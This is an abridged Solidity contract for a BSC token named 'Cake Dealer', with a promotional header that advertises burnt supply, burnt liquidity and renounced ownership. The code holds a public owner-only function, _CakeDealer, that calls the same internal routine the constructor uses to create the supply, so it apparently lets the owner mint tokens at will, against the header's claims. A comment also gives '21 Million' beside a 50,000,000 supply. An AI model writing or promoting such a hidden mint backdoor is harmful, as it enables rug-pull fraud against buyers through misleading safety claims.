 ...
 * ╰━━━┻━━┻╯╰┻━┻━━┻╯╱╰━━━┻╯╰┻╯╰┻━━╯
 * 
 *          Welcome to Cake Dealer
 *              Telegram Group - @cakedealerbsc
 * 
 *              Name   : Cake Dealer
 *              Symbol : CAKEDEAL
 *              Supply 50.000.000
 ...
 *              🔥 Burnt Supply 30%
 *              🔥 LP burn 66%
 *              🟢 Dev & Marketing Wallet 4%
 *              ♻️ Owner Renounced & Contact Verified
 * 
 * 
 * 
 *      About Us
 *      Telegram : https://t.me/cakedealerbsc
 * 
 */
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CakeDealer(uint256 amount) public onlyOwner {
    _dealer(msg.sender, amount);
    }
    ...
    function _dealer(address account, uint256 amount) internal virtual {
...
contract CakeDealerBSC is ERC20 {

    uint tokenTotalSupply = 50000000; // 21 Million

    constructor() public ERC20("Cake Dealer", "CAKEDEAL") {
        _dealer(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}